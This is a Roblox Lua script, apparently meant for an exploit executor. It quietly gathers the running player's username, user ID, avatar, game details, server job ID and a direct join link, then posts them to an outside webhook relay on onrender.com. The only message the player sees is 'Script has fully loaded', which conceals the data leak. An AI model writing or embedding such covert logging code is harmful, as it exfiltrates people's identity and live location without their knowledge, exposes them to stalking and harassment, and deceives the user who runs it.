local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local localPlayer = Players.LocalPlayer or Players:GetPlayers()[1]
local username = localPlayer.Name
local userId = localPlayer.UserId
local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
local jobId = game.JobId
local gameId = tostring(game.GameId)
local placeId = game.PlaceId


local gameName = "Unknown Game"
local success, info = pcall(function()
    return MarketplaceService:GetProductInfo(placeId)
end)
if success and info and info.Name then
    gameName = info.Name
end

local joinUri = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId

local url = "https://discord-stats-api-1.onrender.com/webhook"

local embed = {
    title = "Roblox Server Info",
    color = 3447003,
    thumbnail = {
        url = avatarUrl
    },
    fields = {
        {
            name = "Username",
            value = username,
            inline = true
        },
        {
            name = "User ID",
            value = tostring(userId),
            inline = true
        },
        {
            name = "Game",
            value = gameName,
            inline = false
        },
        {
            name = "Game ID",
            value = gameId,
            inline = false
        },
        {
            name = "Job ID",
            value = jobId,
            inline = false
        },
        {
            name = "Join Server",
            value = "[Click here to try joining](" .. joinUri .. ")",
            inline = false
        }
    },
    footer = {
        text = "Roblox Webhook Logger"
    },
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local payload = {
    embeds = { embed }
}

local headers = {
    ["Content-Type"] = "application/json"
}

local body = HttpService:JSONEncode(payload)

local sendSuccess, response = pcall(function()
    return http_request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end)

if sendSuccess then
    print("Script has fully loaded")
else
    warn("Notify Jack of Error 20", response)
end
